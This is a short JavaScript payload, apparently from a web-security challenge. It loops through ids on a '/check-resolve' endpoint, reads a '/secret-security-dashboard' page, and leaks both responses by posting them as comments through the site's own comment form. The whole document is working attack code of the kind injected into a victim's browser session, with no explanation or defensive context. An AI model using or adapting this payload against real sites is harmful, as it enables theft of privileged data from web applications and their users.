(async () => {
  for (let id = 1; id <= 30; id++) {
    const txt = await fetch('/check-resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `id=${id}`
    }).then(res => res.text());

    const secret = await fetch('/secret-security-dashboard').then(res => res.text());

    const r = await fetch('/post-comment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'comment-author=test' + encodeURIComponent(txt) +
            '&comment2=test' + encodeURIComponent(secret)
    });
  }
})();
